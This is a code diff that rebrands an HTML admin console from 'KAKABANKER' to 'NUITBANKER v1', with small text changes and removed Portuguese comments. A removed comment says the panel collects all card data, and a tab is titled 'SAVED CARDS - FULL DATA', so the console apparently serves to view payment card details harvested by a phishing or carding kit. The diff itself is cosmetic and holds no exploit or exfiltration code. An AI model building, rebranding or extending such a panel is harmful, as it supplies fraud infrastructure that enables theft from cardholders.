@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>KAKABANKER | Admin Console</title>
+    <title>NUITBANKER | Admin Console</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -192,7 +192,6 @@
         .cloud5 { width: 170px; height: 50px; top: 80%; left: 1500px; animation-duration: 2s; }
         @keyframes moveClouds { 0% { transform: translateX(0); } 100% { transform: translateX(-2000px); } }
 
-        /* ========== LOGIN SCREEN ========== */
         .page-container {
             position: fixed;
             top: 0;
@@ -630,7 +629,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ========== RESPONSIVO PARA CELULAR ========== */
+        
         @media (max-width: 768px) {
             .sidebar {
                 transform: translateX(-100%);
@@ -750,7 +749,7 @@
 <div id="loginScreen" class="page-container">
     <div class="container">
         <div class="logo">
-            <h1>KAKABANKER</h1>
+            <h1>NUITBANKER</h1>
             <p>Admin Control Center</p>
         </div>
         <div class="card">
@@ -761,14 +760,14 @@
             </div>
             <div class="form-group">
                 <label>USERNAME</label>
-                <input type="text" id="loginUser" placeholder="kakabanker">
+                <input type="text" id="loginUser" placeholder="username">
             </div>
             <div class="form-group">
                 <label>PASSWORD</label>
                 <input type="password" id="loginPass" placeholder="••••••••">
             </div>
             <button class="btn btn-primary" onclick="handleLogin()">
-                <i class="fas fa-arrow-right"></i> AUTHENTICATE
+                <i class="fas fa-arrow-right"></i> ENTRAR
             </button>
             <div class="security-badge">
                 <i class="fas fa-shield-alt"></i> Secure Connection
@@ -784,7 +783,7 @@
     </div>
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-logo">
-            <h2>KAKABANKER</h2>
+            <h2>NUITBANKER</h2>
             <p>SECURE CONSOLE</p>
         </div>
         <ul class="sidebar-menu">
@@ -799,7 +798,7 @@
 
     <main class="main-content">
         <div class="admin-header">
-            <h1>KAKA <span style="color: #fff">BANKER</span></h1>
+            <h1>NUIT<span style="color: #fff">BANKER v1</span></h1>
             <div class="header-actions">
                 <button class="logout-btn" onclick="handleLogout()">
                     <i class="fas fa-sign-out-alt"></i> EXIT
@@ -857,7 +856,7 @@
             </div>
         </div>
 
-        <!-- CARDS SECTION - COLETA TODOS OS DADOS DO CARTÃO -->
+        
         <div id="tabCards" class="tab-content">
             <div class="section-card">
                 <div class="section-title">SAVED CARDS - FULL DATA</div>
@@ -927,7 +926,7 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-    // ========== FUNDO 3D COM ESTRELAS BRANCAS ==========
+    
     const canvas = document.getElementById('bgCanvas');
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -992,7 +991,7 @@
         renderer.setSize(window.innerWidth, window.innerHeight);
     });
 
-    // ========== MENU TOGGLE PARA CELULAR ==========
+    
     function toggleSidebar() {
         const sidebar = document.getElementById('sidebar');
         sidebar.classList.toggle('open');
